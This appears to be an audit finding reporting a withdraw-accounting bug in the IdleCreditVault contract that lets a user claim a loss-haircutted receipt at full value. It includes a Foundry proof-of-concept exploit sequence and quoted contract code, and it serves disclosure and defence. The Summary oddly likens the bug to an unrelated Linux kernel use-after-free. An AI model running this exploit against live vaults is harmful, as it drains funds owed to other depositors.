### Title
Stale loss-adjusted withdraw receipt is re-claimed at par after `lastWithdrawRequest` is overwritten - (File: contracts/strategies/idle/IdleCreditVault.sol)

### Summary
The kernel UAF in `__configfs_open_file` is a stale-reference bug: an object is freed/cleared under one lock domain but a dangling reference still resolves under another. The analog lives in `IdleCreditVault`'s split withdraw-receipt accounting: loss-adjusted receipts are keyed by `lossRecoveryPriceByEpoch[lastWithdrawRequest[user]]`, while the funded claim path pays the aggregate `withdrawsRequests[user]` at par. When a user makes a new withdraw request in a later epoch, `lastWithdrawRequest` is overwritten, the old epoch's haircut entry becomes unreachable, and the still-populated aggregate entry is paid out at full value.

### Finding Description
`requestWithdraw` records both an aggregate receipt and a per-epoch receipt, then overwrites `lastWithdrawRequest[_user]` with the current epoch [1](#0-0) . When `stopEpochWithDuration` realizes a loss, `collectWithdrawFunds` stores `lossRecoveryPriceByEpoch[epochNumber]` and sets `pendingWithdraws = 0`, i.e. only `pendingBasis * lossRecoveryPrice / RECOVERY_FULL` was actually pulled from the borrower [2](#0-1) .

The loss-adjusted claim is reachable only through `lastWithdrawRequest[_user]` [3](#0-2) . If the user instead submits a fresh `requestWithdraw` in the next epoch, `lastWithdrawRequest` moves to the new epoch, `_claimLossAdjustedWithdrawRequest` reads `lossRecoveryPriceByEpoch[newEpoch] == 0` and returns, and `_claimFundedWithdrawRequest` then pays `withdrawsRequests[_user]` — which still contains the haircutted epoch's `withdrawsRequestsByEpoch[user][lossEpoch]` amount, since `_clearWithdrawClaimForEpoch` was never invoked for it [4](#0-3) . The user therefore receives the full pre-loss basis while only the haircutted amount was funded.

### Impact Explanation
This is direct insolvency/theft with a quantified bound: for each such receipt the vault pays `claimBasis` although only `claimBasis * lossRecoveryPrice / RECOVERY_FULL` was collected. The unfunded `claimBasis * (1 - lossRecoveryPrice/RECOVERY_FULL)` is paid from strategy underlying belonging to other claimants, breaking "one receipt one (funded) payout". `claimWithdrawRequest` unconditionally chains `_claimLossAdjustedWithdrawRequest` then `_claimFundedWithdrawRequest` [5](#0-4) , and the reserve guard in `_transferFundedClaim` only protects `defaultRecoveryReserve`, not underfunded loss receipts [6](#0-5) . An unprivileged tranche holder performs the whole sequence; borrower/manager calls stay honest.

### Likelihood Explanation
The sequence requires a `stopEpochWithDuration` loss epoch and a subsequent buffer-phase request before claiming — a natural usage pattern (the code comments even note users re-request instead of claiming [7](#0-6) ). No privileged misbehavior, oracle input, or timing race is needed; any holder of a loss-adjusted receipt can trigger it, or stumble into it unintentionally.

### Recommendation
In `requestWithdraw`, before overwriting `lastWithdrawRequest[_user]`, check `lossRecoveryPriceByEpoch[lastWithdrawRequest[_user]]` and either revert (forcing the user to claim the loss-adjusted receipt first) or fold the old epoch's claim into the loss-adjusted path. Alternatively, make `_claimLossAdjustedWithdrawRequest` scan `withdrawsRequestsByEpoch` for any epoch with a non-zero `lossRecoveryPriceByEpoch` rather than relying solely on the `lastWithdrawRequest` pointer.

### Proof of Concept
Foundry fork sketch (USDC, 6 decimals):

```solidity
function testStaleLossReceiptClaimedAtPar() external {
    address alice = vm.addr(0xA11CE);
    deal(defaultUnderlying, alice, 100_000e6);
    deal(defaultUnderlying, borrower, 500_000e6);

    // epoch 1: alice deposits AA
    vm.startPrank(alice);
    IERC20Detailed(defaultUnderlying).approve(address(idleCDO), type(uint256).max);
    idleCDO.depositAA(100_000e6);
    vm.stopPrank();

    _toggleEpoch(true, 0, 0);              // startEpoch

    // alice requests full withdraw during buffer of epoch 1
    vm.prank(alice);
    cdoEpoch.requestWithdraw(0, cdoEpoch.AATranche());

    // manager stops epoch WITH a realized loss: borrower funds only 50%
    vm.warp(cdoEpoch.epochEndDate() + 1);
    uint256 pending = vault.pendingWithdraws();
    vm.prank(borrower);
    IERC20Detailed(defaultUnderlying).approve(address(cdoEpoch), pending / 2);
    vm.prank(manager);
    cdoEpoch.stopEpochWithDuration(0, epochDuration, pending / 2); // lossRecoveryPrice ~ 0.5e18
    assertGt(vault.lossRecoveryPriceByEpoch(vault.epochNumber()), 0);

    // alice does NOT claim; new buffer epoch starts
    _toggleEpoch(true, 0, 0);              // startEpoch -> epochNumber increments

    // alice requests a dust withdraw in the new epoch -> lastWithdrawRequest overwritten
    deal(defaultUnderlying, alice, 1e6);
    vm.startPrank(alice);
    IERC20Detailed(defaultUnderlying).approve(address(idleCDO), 1e6);
    idleCDO.depositAA(1e6);
    cdoEpoch.requestWithdraw(0, cdoEpoch.AATranche());
    vm.stopPrank();

    // epoch ends, fully funded for the dust amount
    vm.warp(cdoEpoch.epochEndDate() + 1);
    vm.prank(borrower);
    IERC20Detailed(defaultUnderlying).approve(address(cdoEpoch), vault.pendingWithdraws());
    vm.prank(manager);
    cdoEpoch.stopEpoch(0, 0);

    uint256 balBefore = IERC20Detailed(defaultUnderlying).balanceOf(alice);
    vm.prank(alice);
    cdoEpoch.claimWithdrawRequest();
    uint256 claimed = IERC20Detailed(defaultUnderlying).balanceOf(alice) - balBefore;

    // BUG: alice receives the 50%-haircutted epoch-1 receipt at par plus the dust,
    // while only ~50% of the epoch-1 basis was ever funded.
    assertGt(claimed, (pending / 2) + 1);
}
```

Expected result: `claimed` exceeds the funded amount by `pendingBasis_1 * (1 - lossRecoveryPrice)`, draining underlying that belongs to other pending/funded claimants.

```text
  function collectWithdrawFunds(uint256 _amount) external {
    _onlyIdleCDO();
    uint256 pendingBasis = pendingWithdraws;
    if (_amount < pendingBasis) {
      // Legacy receipts do not have per-epoch ownership data, so they can only be fully funded.
      if (!defaultRecoveryInitialized) revert NotAllowed();
      uint256 lossRecoveryPrice = _amount * RECOVERY_FULL / pendingBasis;
      // Avoid storing a zero price, which is indistinguishable from "no loss-adjusted epoch".
      if (lossRecoveryPrice == 0) revert NotAllowed();
      pendingWithdraws = 0;
      lossRecoveryPriceByEpoch[epochNumber] = lossRecoveryPrice;
    } else {
      // A plain implementation upgrade may leave legacy normal receipts pending. Their next
      // successful stop can fully fund the aggregate before lazy initialization occurs.
      pendingWithdraws = pendingBasis - _amount;
    }
    if (_amount != 0) {
      underlyingToken.safeTransferFrom(idleCDO, address(this), _amount);
    }
  }
```

```text
  function _claimLossAdjustedWithdrawRequest(address _user) internal returns (uint256 amount) {
    uint256 lossEpoch = lastWithdrawRequest[_user];
    uint256 lossRecoveryPrice = lossRecoveryPriceByEpoch[lossEpoch];
    if (lossRecoveryPrice == 0) return amount;

    (uint256 claimBasis, uint256 burnAmount) = _clearWithdrawClaimForEpoch(_user, lossEpoch, false);
    if (claimBasis == 0) return amount;

    // pendingWithdraws was already cleared when the borrower funded the loss-adjusted amount.
    _burn(_user, burnAmount);
    amount = (claimBasis * lossRecoveryPrice) / RECOVERY_FULL;
    _transferFundedClaim(_user, amount);
```

```text
  function _clearWithdrawClaimForEpoch(address _user, uint256 _claimEpoch, bool _isClearingApr0) internal returns (uint256 claimBasis, uint256 burnAmount) {
    (claimBasis, burnAmount) = _withdrawClaimAmountsForEpoch(_user, _claimEpoch);
    if (claimBasis == 0) return (claimBasis, burnAmount);

    uint256 normalAmount = withdrawsRequestsByEpoch[_user][_claimEpoch];
    if (normalAmount != 0) {
      withdrawsRequestsByEpoch[_user][_claimEpoch] = 0;
      // The aggregate may also include older funded receipts; clear only this epoch's piece.
      withdrawsRequests[_user] -= normalAmount;
    }
    Apr0UserData storage apr0User = apr0Users[_user];
    if (apr0User.principal != 0 && apr0User.principalEpoch == _claimEpoch) {
      if (_isClearingApr0) {
        uint256 apr0Principal = apr0User.principal;
        uint256 totalApr0Principal = apr0TotalPrincipal;
        // prepareStopEpochWithApr0 may already close the global APR0 bucket before default finalization.
        apr0TotalPrincipal = apr0Principal >= totalApr0Principal ? 0 : totalApr0Principal - apr0Principal;
      }
      apr0User.principal = 0;
      apr0User.principalEpoch = 0;
    }
    if (lastWithdrawRequest[_user] == _claimEpoch) {
      // The cleared epoch was the latest request marker. Any remaining normal/APR0 receipt
      // is older and already funded, so it can continue to the funded-claim path.
      lastWithdrawRequest[_user] = 0;
    }
```

```text
  function _transferFundedClaim(address _user, uint256 _amount) internal {
    if (_amount == 0) return;
    uint256 reserve = defaultRecoveryReserve;
    if (reserve != 0) {
      uint256 balance = underlyingToken.balanceOf(address(this));
      // This should be unreachable when accounting is consistent. Keep the guard so old funded
      // receipts can never spend underlyings reserved for default recovery claimants.
      if (balance < reserve || balance - reserve < _amount) revert NotAllowed();
    }
    underlyingToken.safeTransfer(_user, _amount);
  }
```
